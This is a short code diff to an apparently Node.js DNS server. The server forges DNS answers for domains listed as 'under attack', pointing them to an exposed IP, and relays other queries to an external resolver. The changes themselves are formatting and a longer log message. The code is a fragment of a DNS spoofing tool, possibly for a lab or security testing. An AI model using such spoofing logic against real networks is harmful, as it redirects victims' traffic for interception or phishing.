@@ -30,7 +30,7 @@ function get_domain_from_DNS_query(buffer) {
     return sections.join(".")
 }
 
-const {EXPOSED_IP,DOMAINS_UNDER_ATTACK, EXTERNAL_DNS} = require("../config");
+const { EXPOSED_IP, DOMAINS_UNDER_ATTACK, EXTERNAL_DNS } = require("../config");
 
 
 
@@ -49,15 +49,18 @@ function proxify(rinfo, data) {
 server.on('data', async function (rinfo, data) {
     let domain = get_domain_from_DNS_query(data);
     if (DOMAINS_UNDER_ATTACK.indexOf(domain) == -1) {
-        console.log("dns not spoofed for",domain);
+        console.log("dns not spoofed for", domain);
         proxify(rinfo, data);
         return;
     }
-    console.log("dns spoofed for",domain);
+    console.log("dns spoofed for", domain, "at", EXPOSED_IP);
 
     server.port(rinfo.port).send(forge_DNS_response(data, EXPOSED_IP, 60), rinfo.address)
 
 })
+
+
+
 
 
 console.log("DNS up");
